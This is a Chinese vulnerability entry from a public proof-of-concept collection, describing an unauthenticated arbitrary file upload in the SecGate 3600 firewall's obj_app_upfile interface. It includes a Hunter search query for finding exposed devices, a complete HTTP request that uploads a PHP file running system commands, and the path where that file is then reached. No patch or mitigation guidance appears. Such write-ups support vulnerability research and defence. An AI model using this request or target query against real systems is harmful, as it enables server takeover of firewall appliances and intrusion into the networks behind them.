# 网神SecGata 3600防火墙obj_app_upfile任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">网神 SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 网神SecGata 3600防火墙

# 三、资产测绘
+ hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"`


+ 登录页面


# 四、漏洞复现
<font style="color:rgb(0, 0, 0);">没有对文件调用进行鉴权，且文件上传路径为可访问路径，造成任意文件上传</font>

```java
POST /?g=obj_app_upfile HTTP/1.1
Host: xx.xx.xx.xx
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 569
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="test.php"
Content-Type: text/plain

<?php system("id");unlink(__FILE__);?>

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```


<font style="color:rgb(0, 0, 0);">默认上传路径 </font>`<font style="color:rgb(0, 0, 0);">/secgate/webui/attachements/</font>`<font style="color:rgb(0, 0, 0);"> ， 访问 </font>`<font style="color:rgb(0, 0, 0);">attachements/test.php</font>`<font style="color:rgb(0, 0, 0);"> 文件</font>


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yrkaybyh5yggyktv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
